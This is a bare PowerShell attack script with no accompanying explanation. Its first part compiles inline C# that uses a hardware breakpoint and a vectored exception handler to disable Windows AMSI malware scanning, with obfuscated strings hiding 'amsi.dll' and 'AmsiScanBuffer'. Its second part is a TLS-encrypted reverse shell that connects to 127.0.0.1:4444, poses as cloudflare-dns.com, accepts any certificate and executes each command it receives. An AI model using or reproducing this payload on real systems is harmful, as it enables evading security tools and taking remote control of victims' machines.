& {$IAhNXM = @"
using System;
using System.Runtime.InteropServices;
public class MWJUx7V2G {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetCurrentThread();
    [DllImport("kernel32")]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT ctx);
    [DllImport("kernel32")]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT ctx);
    [DllImport("kernel32")]
    public static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);
    public delegate long VEH(IntPtr pExceptionInfo);
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT {
        public long P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1232)]
        public byte[] ExtRegs;
    }
    private static IntPtr _target;
    public static void SetTarget(IntPtr addr) { _target = addr; }
    public static long Handler(IntPtr pInfo) {
        var rec = Marshal.ReadIntPtr(pInfo);
        var code = (uint)Marshal.ReadInt32(rec);
        var ctx = Marshal.ReadIntPtr(pInfo, IntPtr.Size);
        if (code == 0x80000004) {
            var rip = Marshal.ReadInt64(ctx, 0xF8);
            if ((ulong)rip == (ulong)_target) {
                Marshal.WriteInt64(ctx, 0x78, 0x80070057);
                var rsp = Marshal.ReadInt64(ctx, 0x98);
                Marshal.WriteInt64(ctx, 0xF8, Marshal.ReadInt64(new IntPtr(rsp)));
                Marshal.WriteInt64(ctx, 0x98, rsp + 8);
                return -1;
            }
        }
        return 0;
    }
}
"@
Add-tYpe $IAHnXm
$QyRh9WqWy = [MWjuX7v2g]::lOAdLiBrARy($([StriNg][Char](97+83-83)+[ChaR](109+83-83)+[chaR]((0xFb9E -bxOR 0XfbED))+[Char]([Byte]0X69)+[cHaR]([BYtE]0X2e)+[CHar]([byTE]0x64)+[Char]([ByTE]0x6C)+[ChAr](79+29)))
$zktgh2dtvBv8N = [MWJux7v2g]::GEtprocaddREss($QYrh9wqWY, $(('reffuBnacSismA'[(7+6)..0] -jOIn '')))
[mWJUx7V2g]::seTTaRgEt($zKtgH2dtvbv8n)
$XL0xlbmLw = [dELeGATe]::CrEaTEDElEgaTe([MWJux7v2g+veH],[MwjUx7v2G].geTMETHOd('Handler'))
[mwJuX7v2g]::AdDVEcTorEdExCepTiONHANdLEr(1, [systEM.RuntiME.InteropServIcES.mArShaL]::getFuncTionpOInTERfoRDElEGatE($xl0xLBmlW))
$UatZe5utclA = NEw-obJecT mWjuX7V2G+cOntExt
$uAtzE5utClA.conTEXtflAGS = 0X100010
$jcpSG5 = [mWJuX7v2G]::getcurrenTThREad()
[MwjuX7v2g]::GeTThreadcoNteXT($jCPsg5, [rEF]$UATZe5utcla)
$uaTzE5UtClA.dR0 = [uint64]$ZkTGH2DtvBv8N.tOInt64()
$UAtze5UTcla.Dr7 = $UATze5UtclA.dr7 -boR 1
[MWJuX7v2G]::SetTHREaDcONteXt($JCpSg5, [REf]$UATze5uTcla)}

$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 4444);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
